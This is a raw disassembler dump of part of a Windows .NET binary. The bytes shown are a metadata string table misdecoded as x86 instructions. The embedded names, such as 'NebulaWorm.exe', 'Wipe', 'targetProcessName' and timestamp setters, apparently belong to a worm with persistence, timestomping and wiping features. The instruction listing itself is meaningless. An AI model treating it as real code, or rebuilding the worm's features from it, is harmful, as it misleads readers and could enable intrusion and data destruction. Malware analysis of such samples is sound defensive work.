  407b97:	4d                   	dec    %ebp
  407b98:	61                   	popa
  407b99:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ba0:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ba4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ba5:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ba8:	73 4d                	jae    0x407bf7
  407baa:	6f                   	outsl  %ds:(%esi),(%dx)
  407bab:	64 75 6c             	fs jne 0x407c1a
  407bae:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407bb2:	74 5f                	je     0x407c13
  407bb4:	57                   	push   %edi
  407bb5:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407bbc:	79 6c                	jns    0x407c2a
  407bbe:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407bc2:	6f                   	outsl  %ds:(%esi),(%dx)
  407bc3:	63 65 73             	arpl   %esp,0x73(%ebp)
  407bc6:	73 57                	jae    0x407c1f
  407bc8:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407bcf:	79 6c                	jns    0x407c3d
  407bd1:	65 00 70 72          	add    %dh,%gs:0x72(%eax)
  407bd5:	6f                   	outsl  %ds:(%esi),(%dx)
  407bd6:	63 4e 61             	arpl   %ecx,0x61(%esi)
  407bd9:	6d                   	insl   (%dx),%es:(%edi)
  407bda:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407bde:	74 5f                	je     0x407c3f
  407be0:	46                   	inc    %esi
  407be1:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407be8:	00 
  407be9:	73 65                	jae    0x407c50
  407beb:	74 5f                	je     0x407c4c
  407bed:	46                   	inc    %esi
  407bee:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407bf5:	00 
  407bf6:	47                   	inc    %edi
  407bf7:	65 6e                	outsb  %gs:(%esi),(%dx)
  407bf9:	65 72 61             	gs jb  0x407c5d
  407bfc:	74 65                	je     0x407c63
  407bfe:	52                   	push   %edx
  407bff:	61                   	popa
  407c00:	6e                   	outsb  %ds:(%esi),(%dx)
  407c01:	64 6f                	outsl  %fs:(%esi),(%dx)
  407c03:	6d                   	insl   (%dx),%es:(%edi)
  407c04:	46                   	inc    %esi
  407c05:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407c0c:	00 
  407c0d:	47                   	inc    %edi
  407c0e:	65 74 52             	gs je  0x407c63
  407c11:	61                   	popa
  407c12:	6e                   	outsb  %ds:(%esi),(%dx)
  407c13:	64 6f                	outsl  %fs:(%esi),(%dx)
  407c15:	6d                   	insl   (%dx),%es:(%edi)
  407c16:	46                   	inc    %esi
  407c17:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407c1e:	00 
  407c1f:	6c                   	insb   (%dx),%es:(%edi)
  407c20:	70 46                	jo     0x407c68
  407c22:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407c29:	00 
  407c2a:	6c                   	insb   (%dx),%es:(%edi)
  407c2b:	70 4d                	jo     0x407c7a
  407c2d:	6f                   	outsl  %ds:(%esi),(%dx)
  407c2e:	64 75 6c             	fs jne 0x407c9d
  407c31:	65 4e                	gs dec %esi
  407c33:	61                   	popa
  407c34:	6d                   	insl   (%dx),%es:(%edi)
  407c35:	65 00 64 62 67       	add    %ah,%gs:0x67(%edx,%eiz,2)
  407c3a:	4e                   	dec    %esi
  407c3b:	61                   	popa
  407c3c:	6d                   	insl   (%dx),%es:(%edi)
  407c3d:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407c41:	74 5f                	je     0x407ca2
  407c43:	46                   	inc    %esi
  407c44:	75 6c                	jne    0x407cb2
  407c46:	6c                   	insb   (%dx),%es:(%edi)
  407c47:	4e                   	dec    %esi
  407c48:	61                   	popa
  407c49:	6d                   	insl   (%dx),%es:(%edi)
  407c4a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407c4e:	74 5f                	je     0x407caf
  407c50:	50                   	push   %eax
  407c51:	72 6f                	jb     0x407cc2
  407c53:	63 65 73             	arpl   %esp,0x73(%ebp)
  407c56:	73 4e                	jae    0x407ca6
  407c58:	61                   	popa
  407c59:	6d                   	insl   (%dx),%es:(%edi)
  407c5a:	65 00 74 61 72       	add    %dh,%gs:0x72(%ecx,%eiz,2)
  407c5f:	67 65 74 50          	addr16 gs je 0x407cb3
  407c63:	72 6f                	jb     0x407cd4
  407c65:	63 65 73             	arpl   %esp,0x73(%ebp)
  407c68:	73 4e                	jae    0x407cb8
  407c6a:	61                   	popa
  407c6b:	6d                   	insl   (%dx),%es:(%edi)
  407c6c:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407c70:	74 48                	je     0x407cba
  407c72:	6f                   	outsl  %ds:(%esi),(%dx)
  407c73:	73 74                	jae    0x407ce9
  407c75:	4e                   	dec    %esi
  407c76:	61                   	popa
  407c77:	6d                   	insl   (%dx),%es:(%edi)
  407c78:	65 00 72 65          	add    %dh,%gs:0x65(%edx)
  407c7c:	67 69 73 74 72 79 4b 	imul   $0x654b7972,0x74(%bp,%di),%esi
  407c83:	65 
  407c84:	79 4e                	jns    0x407cd4
  407c86:	61                   	popa
  407c87:	6d                   	insl   (%dx),%es:(%edi)
  407c88:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407c8c:	74 44                	je     0x407cd2
  407c8e:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  407c95:	79 4e                	jns    0x407ce5
  407c97:	61                   	popa
  407c98:	6d                   	insl   (%dx),%es:(%edi)
  407c99:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407c9d:	74 5f                	je     0x407cfe
  407c9f:	55                   	push   %ebp
  407ca0:	73 65                	jae    0x407d07
  407ca2:	72 6e                	jb     0x407d12
  407ca4:	61                   	popa
  407ca5:	6d                   	insl   (%dx),%es:(%edi)
  407ca6:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407cab:	65 54                	gs push %esp
  407cad:	69 6d 65 00 47 65 74 	imul   $0x74654700,0x65(%ebp),%ebp
  407cb4:	4c                   	dec    %esp
  407cb5:	61                   	popa
  407cb6:	73 74                	jae    0x407d2c
  407cb8:	57                   	push   %edi
  407cb9:	72 69                	jb     0x407d24
  407cbb:	74 65                	je     0x407d22
  407cbd:	54                   	push   %esp
  407cbe:	69 6d 65 00 53 65 74 	imul   $0x74655300,0x65(%ebp),%ebp
  407cc5:	4c                   	dec    %esp
  407cc6:	61                   	popa
  407cc7:	73 74                	jae    0x407d3d
  407cc9:	57                   	push   %edi
  407cca:	72 69                	jb     0x407d35
  407ccc:	74 65                	je     0x407d33
  407cce:	54                   	push   %esp
  407ccf:	69 6d 65 00 47 65 74 	imul   $0x74654700,0x65(%ebp),%ebp
  407cd6:	43                   	inc    %ebx
  407cd7:	72 65                	jb     0x407d3e
  407cd9:	61                   	popa
  407cda:	74 69                	je     0x407d45
  407cdc:	6f                   	outsl  %ds:(%esi),(%dx)
  407cdd:	6e                   	outsb  %ds:(%esi),(%dx)
  407cde:	54                   	push   %esp
  407cdf:	69 6d 65 00 53 65 74 	imul   $0x74655300,0x65(%ebp),%ebp
  407ce6:	43                   	inc    %ebx
  407ce7:	72 65                	jb     0x407d4e
  407ce9:	61                   	popa
  407cea:	74 69                	je     0x407d55
  407cec:	6f                   	outsl  %ds:(%esi),(%dx)
  407ced:	6e                   	outsb  %ds:(%esi),(%dx)
  407cee:	54                   	push   %esp
  407cef:	69 6d 65 00 47 65 74 	imul   $0x74654700,0x65(%ebp),%ebp
  407cf6:	4c                   	dec    %esp
  407cf7:	61                   	popa
  407cf8:	73 74                	jae    0x407d6e
  407cfa:	41                   	inc    %ecx
  407cfb:	63 63 65             	arpl   %esp,0x65(%ebx)
  407cfe:	73 73                	jae    0x407d73
  407d00:	54                   	push   %esp
  407d01:	69 6d 65 00 53 65 74 	imul   $0x74655300,0x65(%ebp),%ebp
  407d08:	4c                   	dec    %esp
  407d09:	61                   	popa
  407d0a:	73 74                	jae    0x407d80
  407d0c:	41                   	inc    %ecx
  407d0d:	63 63 65             	arpl   %esp,0x65(%ebx)
  407d10:	73 73                	jae    0x407d85
  407d12:	54                   	push   %esp
  407d13:	69 6d 65 00 52 65 61 	imul   $0x61655200,0x65(%ebp),%ebp
  407d1a:	64 4c                	fs dec %esp
  407d1c:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  407d23:	74 65                	je     0x407d8a
  407d25:	4c                   	dec    %esp
  407d26:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  407d2d:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  407d30:	65 00 49 41          	add    %cl,%gs:0x41(%ecx)
  407d34:	73 79                	jae    0x407daf
  407d36:	6e                   	outsb  %ds:(%esi),(%dx)
  407d37:	63 53 74             	arpl   %edx,0x74(%ebx)
  407d3a:	61                   	popa
  407d3b:	74 65                	je     0x407da2
  407d3d:	4d                   	dec    %ebp
  407d3e:	61                   	popa
  407d3f:	63 68 69             	arpl   %ebp,0x69(%eax)
  407d42:	6e                   	outsb  %ds:(%esi),(%dx)
  407d43:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407d47:	74 53                	je     0x407d9c
  407d49:	74 61                	je     0x407dac
  407d4b:	74 65                	je     0x407db2
  407d4d:	4d                   	dec    %ebp
  407d4e:	61                   	popa
  407d4f:	63 68 69             	arpl   %ebp,0x69(%eax)
  407d52:	6e                   	outsb  %ds:(%esi),(%dx)
  407d53:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
  407d57:	61                   	popa
  407d58:	74 65                	je     0x407dbf
  407d5a:	4d                   	dec    %ebp
  407d5b:	61                   	popa
  407d5c:	63 68 69             	arpl   %ebp,0x69(%eax)
  407d5f:	6e                   	outsb  %ds:(%esi),(%dx)
  407d60:	65 00 4c 6f 63       	add    %cl,%gs:0x63(%edi,%ebp,2)
  407d65:	61                   	popa
  407d66:	6c                   	insb   (%dx),%es:(%edi)
  407d67:	4d                   	dec    %ebp
  407d68:	61                   	popa
  407d69:	63 68 69             	arpl   %ebp,0x69(%eax)
  407d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  407d6d:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407d71:	70 65                	jo     0x407dd8
  407d73:	00 4d 61             	add    %cl,0x61(%ebp)
  407d76:	6e                   	outsb  %ds:(%esi),(%dx)
  407d77:	61                   	popa
  407d78:	67 65 6d             	gs insl (%dx),%es:(%di)
  407d7b:	65 6e                	outsb  %gs:(%esi),(%dx)
  407d7d:	74 53                	je     0x407dd2
  407d7f:	63 6f 70             	arpl   %ebp,0x70(%edi)
  407d82:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  407d86:	6c                   	insb   (%dx),%es:(%edi)
  407d87:	75 65                	jne    0x407dee
  407d89:	54                   	push   %esp
  407d8a:	79 70                	jns    0x407dfc
  407d8c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407d90:	74 5f                	je     0x407df1
  407d92:	44                   	inc    %esp
  407d93:	72 69                	jb     0x407dfe
  407d95:	76 65                	jbe    0x407dfc
  407d97:	54                   	push   %esp
  407d98:	79 70                	jns    0x407e0a
  407d9a:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407d9e:	6f                   	outsl  %ds:(%esi),(%dx)
  407d9f:	74 6f                	je     0x407e10
  407da1:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  407da4:	54                   	push   %esp
  407da5:	79 70                	jns    0x407e17
  407da7:	65 00 66 6c          	add    %ah,%gs:0x6c(%esi)
  407dab:	41                   	inc    %ecx
  407dac:	6c                   	insb   (%dx),%es:(%edi)
  407dad:	6c                   	insb   (%dx),%es:(%edi)
  407dae:	6f                   	outsl  %ds:(%esi),(%dx)
  407daf:	63 61 74             	arpl   %esp,0x74(%ecx)
  407db2:	69 6f 6e 54 79 70 65 	imul   $0x65707954,0x6e(%edi),%ebp
  407db9:	00 53 6f             	add    %dl,0x6f(%ebx)
  407dbc:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407dbf:	74 54                	je     0x407e15
  407dc1:	79 70                	jns    0x407e33
  407dc3:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407dc7:	74 5f                	je     0x407e28
  407dc9:	43                   	inc    %ebx
  407dca:	6f                   	outsl  %ds:(%esi),(%dx)
  407dcb:	6e                   	outsb  %ds:(%esi),(%dx)
  407dcc:	74 65                	je     0x407e33
  407dce:	6e                   	outsb  %ds:(%esi),(%dx)
  407dcf:	74 54                	je     0x407e25
  407dd1:	79 70                	jns    0x407e43
  407dd3:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407dd7:	74 50                	je     0x407e29
  407dd9:	72 6f                	jb     0x407e4a
  407ddb:	63 65 73             	arpl   %esp,0x73(%ebp)
  407dde:	73 44                	jae    0x407e24
  407de0:	50                   	push   %eax
  407de1:	49                   	dec    %ecx
  407de2:	41                   	inc    %ecx
  407de3:	77 61                	ja     0x407e46
  407de5:	72 65                	jb     0x407e4c
  407de7:	00 53 79             	add    %dl,0x79(%ebx)
  407dea:	73 74                	jae    0x407e60
  407dec:	65 6d                	gs insl (%dx),%es:(%edi)
  407dee:	2e 43                	cs inc %ebx
  407df0:	6f                   	outsl  %ds:(%esi),(%dx)
  407df1:	72 65                	jb     0x407e58
  407df3:	00 43 61             	add    %al,0x61(%ebx)
  407df6:	70 74                	jo     0x407e6c
  407df8:	75 72                	jne    0x407e6c
  407dfa:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  407dfe:	6c                   	insb   (%dx),%es:(%edi)
  407dff:	65 61                	gs popa
  407e01:	73 65                	jae    0x407e68
  407e03:	00 67 65             	add    %ah,0x65(%edi)
  407e06:	74 5f                	je     0x407e67
  407e08:	52                   	push   %edx
  407e09:	65 73 70             	gs jae 0x407e7c
  407e0c:	6f                   	outsl  %ds:(%esi),(%dx)
  407e0d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e0e:	73 65                	jae    0x407e75
  407e10:	00 48 74             	add    %cl,0x74(%eax)
  407e13:	74 70                	je     0x407e85
  407e15:	4c                   	dec    %esp
  407e16:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  407e1d:	52                   	push   %edx
  407e1e:	65 73 70             	gs jae 0x407e91
  407e21:	6f                   	outsl  %ds:(%esi),(%dx)
  407e22:	6e                   	outsb  %ds:(%esi),(%dx)
  407e23:	73 65                	jae    0x407e8a
  407e25:	00 43 6c             	add    %al,0x6c(%ebx)
  407e28:	6f                   	outsl  %ds:(%esi),(%dx)
  407e29:	73 65                	jae    0x407e90
  407e2b:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  407e2f:	70 6f                	jo     0x407ea0
  407e31:	73 65                	jae    0x407e98
  407e33:	00 43 72             	add    %al,0x72(%ebx)
  407e36:	65 61                	gs popa
  407e38:	74 65                	je     0x407e9f
  407e3a:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407e3d:	31 5f 5f             	xor    %ebx,0x5f(%edi)
  407e40:	73 74                	jae    0x407eb6
  407e42:	61                   	popa
  407e43:	74 65                	je     0x407eaa
  407e45:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  407e49:	65 74 65             	gs je  0x407eb1
  407e4c:	00 53 61             	add    %dl,0x61(%ebx)
  407e4f:	66 65 43             	gs inc %bx
  407e52:	6f                   	outsl  %ds:(%esi),(%dx)
  407e53:	6e                   	outsb  %ds:(%esi),(%dx)
  407e54:	73 6f                	jae    0x407ec5
  407e56:	6c                   	insb   (%dx),%es:(%edi)
  407e57:	65 57                	gs push %edi
  407e59:	72 69                	jb     0x407ec4
  407e5b:	74 65                	je     0x407ec2
  407e5d:	00 53 54             	add    %dl,0x54(%ebx)
  407e60:	41                   	inc    %ecx
  407e61:	54                   	push   %esp
  407e62:	68 72 65 61 64       	push   $0x64616572
  407e67:	41                   	inc    %ecx
  407e68:	74 74                	je     0x407ede
  407e6a:	72 69                	jb     0x407ed5
  407e6c:	62 75 74             	bound  %esi,0x74(%ebp)
  407e6f:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407e73:	6d                   	insl   (%dx),%es:(%edi)
  407e74:	70 69                	jo     0x407edf
  407e76:	6c                   	insb   (%dx),%es:(%edi)
  407e77:	65 72 47             	gs jb  0x407ec1
  407e7a:	65 6e                	outsb  %gs:(%esi),(%dx)
  407e7c:	65 72 61             	gs jb  0x407ee0
  407e7f:	74 65                	je     0x407ee6
  407e81:	64 41                	fs inc %ecx
  407e83:	74 74                	je     0x407ef9
  407e85:	72 69                	jb     0x407ef0
  407e87:	62 75 74             	bound  %esi,0x74(%ebp)
  407e8a:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  407e8e:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  407e95:	62 
  407e96:	75 74                	jne    0x407f0c
  407e98:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  407e9c:	76 65                	jbe    0x407f03
  407e9e:	72 69                	jb     0x407f09
  407ea0:	66 69 61 62 6c 65    	imul   $0x656c,0x62(%ecx),%sp
  407ea6:	43                   	inc    %ebx
  407ea7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea8:	64 65 41             	fs gs inc %ecx
  407eab:	74 74                	je     0x407f21
  407ead:	72 69                	jb     0x407f18
  407eaf:	62 75 74             	bound  %esi,0x74(%ebp)
  407eb2:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  407eb7:	75 67                	jne    0x407f20
  407eb9:	67 61                	addr16 popa
  407ebb:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  407ebf:	74 74                	je     0x407f35
  407ec1:	72 69                	jb     0x407f2c
  407ec3:	62 75 74             	bound  %esi,0x74(%ebp)
  407ec6:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407eca:	6d                   	insl   (%dx),%es:(%edi)
  407ecb:	56                   	push   %esi
  407ecc:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  407ed3:	74 74                	je     0x407f49
  407ed5:	72 69                	jb     0x407f40
  407ed7:	62 75 74             	bound  %esi,0x74(%ebp)
  407eda:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407ede:	73 65                	jae    0x407f45
  407ee0:	6d                   	insl   (%dx),%es:(%edi)
  407ee1:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407ee5:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  407eec:	72 
  407eed:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407ef4:	73 79                	jae    0x407f6f
  407ef6:	6e                   	outsb  %ds:(%esi),(%dx)
  407ef7:	63 53 74             	arpl   %edx,0x74(%ebx)
  407efa:	61                   	popa
  407efb:	74 65                	je     0x407f62
  407efd:	4d                   	dec    %ebp
  407efe:	61                   	popa
  407eff:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f02:	6e                   	outsb  %ds:(%esi),(%dx)
  407f03:	65 41                	gs inc %ecx
  407f05:	74 74                	je     0x407f7b
  407f07:	72 69                	jb     0x407f72
  407f09:	62 75 74             	bound  %esi,0x74(%ebp)
  407f0c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407f10:	73 65                	jae    0x407f77
  407f12:	6d                   	insl   (%dx),%es:(%edi)
  407f13:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407f17:	72 61                	jb     0x407f7a
  407f19:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  407f1c:	61                   	popa
  407f1d:	72 6b                	jb     0x407f8a
  407f1f:	41                   	inc    %ecx
  407f20:	74 74                	je     0x407f96
  407f22:	72 69                	jb     0x407f8d
  407f24:	62 75 74             	bound  %esi,0x74(%ebp)
  407f27:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  407f2c:	67 65 74 46          	addr16 gs je 0x407f76
  407f30:	72 61                	jb     0x407f93
  407f32:	6d                   	insl   (%dx),%es:(%edi)
  407f33:	65 77 6f             	gs ja  0x407fa5
  407f36:	72 6b                	jb     0x407fa3
  407f38:	41                   	inc    %ecx
  407f39:	74 74                	je     0x407faf
  407f3b:	72 69                	jb     0x407fa6
  407f3d:	62 75 74             	bound  %esi,0x74(%ebp)
  407f40:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  407f45:	75 67                	jne    0x407fae
  407f47:	67 65 72 48          	addr16 gs jb 0x407f93
  407f4b:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  407f52:	74 
  407f53:	72 69                	jb     0x407fbe
  407f55:	62 75 74             	bound  %esi,0x74(%ebp)
  407f58:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407f5c:	73 65                	jae    0x407fc3
  407f5e:	6d                   	insl   (%dx),%es:(%edi)
  407f5f:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  407f63:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  407f6a:	69 
  407f6b:	6f                   	outsl  %ds:(%esi),(%dx)
  407f6c:	6e                   	outsb  %ds:(%esi),(%dx)
  407f6d:	41                   	inc    %ecx
  407f6e:	74 74                	je     0x407fe4
  407f70:	72 69                	jb     0x407fdb
  407f72:	62 75 74             	bound  %esi,0x74(%ebp)
  407f75:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407f79:	63 75 72             	arpl   %esi,0x72(%ebp)
  407f7c:	69 74 79 50 65 72 6d 	imul   $0x696d7265,0x50(%ecx,%edi,2),%esi
  407f83:	69 
  407f84:	73 73                	jae    0x407ff9
  407f86:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407f8d:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407f94:	73 73                	jae    0x408009
  407f96:	65 6d                	gs insl (%dx),%es:(%edi)
  407f98:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407f9c:	6f                   	outsl  %ds:(%esi),(%dx)
  407f9d:	6e                   	outsb  %ds:(%esi),(%dx)
  407f9e:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  407fa4:	74 69                	je     0x40800f
  407fa6:	6f                   	outsl  %ds:(%esi),(%dx)
  407fa7:	6e                   	outsb  %ds:(%esi),(%dx)
  407fa8:	41                   	inc    %ecx
  407fa9:	74 74                	je     0x40801f
  407fab:	72 69                	jb     0x408016
  407fad:	62 75 74             	bound  %esi,0x74(%ebp)
  407fb0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407fb4:	73 65                	jae    0x40801b
  407fb6:	6d                   	insl   (%dx),%es:(%edi)
  407fb7:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  407fbb:	65 73 63             	gs jae 0x408021
  407fbe:	72 69                	jb     0x408029
  407fc0:	70 74                	jo     0x408036
  407fc2:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407fc9:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  407fd0:	6f                   	outsl  %ds:(%esi),(%dx)
  407fd1:	6d                   	insl   (%dx),%es:(%edi)
  407fd2:	70 69                	jo     0x40803d
  407fd4:	6c                   	insb   (%dx),%es:(%edi)
  407fd5:	61                   	popa
  407fd6:	74 69                	je     0x408041
  407fd8:	6f                   	outsl  %ds:(%esi),(%dx)
  407fd9:	6e                   	outsb  %ds:(%esi),(%dx)
  407fda:	52                   	push   %edx
  407fdb:	65 6c                	gs insb (%dx),%es:(%edi)
  407fdd:	61                   	popa
  407fde:	78 61                	js     0x408041
  407fe0:	74 69                	je     0x40804b
  407fe2:	6f                   	outsl  %ds:(%esi),(%dx)
  407fe3:	6e                   	outsb  %ds:(%esi),(%dx)
  407fe4:	73 41                	jae    0x408027
  407fe6:	74 74                	je     0x40805c
  407fe8:	72 69                	jb     0x408053
  407fea:	62 75 74             	bound  %esi,0x74(%ebp)
  407fed:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407ff1:	73 65                	jae    0x408058
  407ff3:	6d                   	insl   (%dx),%es:(%edi)
  407ff4:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  407ff8:	72 6f                	jb     0x408069
  407ffa:	64 75 63             	fs jne 0x408060
  407ffd:	74 41                	je     0x408040
  407fff:	74 74                	je     0x408075
  408001:	72 69                	jb     0x40806c
  408003:	62 75 74             	bound  %esi,0x74(%ebp)
  408006:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40800a:	73 65                	jae    0x408071
  40800c:	6d                   	insl   (%dx),%es:(%edi)
  40800d:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408011:	6f                   	outsl  %ds:(%esi),(%dx)
  408012:	70 79                	jo     0x40808d
  408014:	72 69                	jb     0x40807f
  408016:	67 68 74 41 74 74    	addr16 push $0x74744174
  40801c:	72 69                	jb     0x408087
  40801e:	62 75 74             	bound  %esi,0x74(%ebp)
  408021:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408025:	73 65                	jae    0x40808c
  408027:	6d                   	insl   (%dx),%es:(%edi)
  408028:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40802c:	6f                   	outsl  %ds:(%esi),(%dx)
  40802d:	6d                   	insl   (%dx),%es:(%edi)
  40802e:	70 61                	jo     0x408091
  408030:	6e                   	outsb  %ds:(%esi),(%dx)
  408031:	79 41                	jns    0x408074
  408033:	74 74                	je     0x4080a9
  408035:	72 69                	jb     0x4080a0
  408037:	62 75 74             	bound  %esi,0x74(%ebp)
  40803a:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40803e:	6e                   	outsb  %ds:(%esi),(%dx)
  40803f:	74 69                	je     0x4080aa
  408041:	6d                   	insl   (%dx),%es:(%edi)
  408042:	65 43                	gs inc %ebx
  408044:	6f                   	outsl  %ds:(%esi),(%dx)
  408045:	6d                   	insl   (%dx),%es:(%edi)
  408046:	70 61                	jo     0x4080a9
  408048:	74 69                	je     0x4080b3
  40804a:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  40804d:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408054:	69 
  408055:	62 75 74             	bound  %esi,0x74(%ebp)
  408058:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  40805c:	65 63 6b 41          	arpl   %ebp,%gs:0x41(%ebx)
  408060:	6e                   	outsb  %ds:(%esi),(%dx)
  408061:	64 45                	fs inc %ebp
  408063:	78 65                	js     0x4080ca
  408065:	63 75 74             	arpl   %esi,0x74(%ebp)
  408068:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40806c:	74 5f                	je     0x4080cd
  40806e:	55                   	push   %ebp
  40806f:	73 65                	jae    0x4080d6
  408071:	53                   	push   %ebx
  408072:	68 65 6c 6c 45       	push   $0x456c6c65
  408077:	78 65                	js     0x4080de
  408079:	63 75 74             	arpl   %esi,0x74(%ebp)
  40807c:	65 00 54 6f 42       	add    %dl,%gs:0x42(%edi,%ebp,2)
  408081:	79 74                	jns    0x4080f7
  408083:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  408088:	65 74 65             	gs je  0x4080f0
  40808b:	56                   	push   %esi
  40808c:	61                   	popa
  40808d:	6c                   	insb   (%dx),%es:(%edi)
  40808e:	75 65                	jne    0x4080f5
  408090:	00 47 65             	add    %al,0x65(%edi)
  408093:	74 56                	je     0x4080eb
  408095:	61                   	popa
  408096:	6c                   	insb   (%dx),%es:(%edi)
  408097:	75 65                	jne    0x4080fe
  408099:	00 53 65             	add    %dl,0x65(%ebx)
  40809c:	74 56                	je     0x4080f4
  40809e:	61                   	popa
  40809f:	6c                   	insb   (%dx),%es:(%edi)
  4080a0:	75 65                	jne    0x408107
  4080a2:	00 52 65             	add    %dl,0x65(%edx)
  4080a5:	63 65 69             	arpl   %esp,0x69(%ebp)
  4080a8:	76 65                	jbe    0x40810f
  4080aa:	00 49 73             	add    %cl,0x73(%ecx)
  4080ad:	48                   	dec    %eax
  4080ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4080af:	73 74                	jae    0x408125
  4080b1:	41                   	inc    %ecx
  4080b2:	6c                   	insb   (%dx),%es:(%edi)
  4080b3:	69 76 65 00 74 61 72 	imul   $0x72617400,0x65(%esi),%esi
  4080ba:	67 65 74 45          	addr16 gs je 0x408103
  4080be:	78 65                	js     0x408125
  4080c0:	00 4e 65             	add    %cl,0x65(%esi)
  4080c3:	62 75 6c             	bound  %esi,0x6c(%ebp)
  4080c6:	61                   	popa
  4080c7:	57                   	push   %edi
  4080c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4080c9:	72 6d                	jb     0x408138
  4080cb:	2e 65 78 65          	cs js,pn 0x408134
  4080cf:	00 64 77 53          	add    %ah,0x53(%edi,%esi,2)
  4080d3:	74 61                	je     0x408136
  4080d5:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  4080d8:	69 7a 65 00 64 77 53 	imul   $0x53776400,0x65(%edx),%edi
  4080df:	69 7a 65 00 73 69 7a 	imul   $0x7a697300,0x65(%edx),%edi
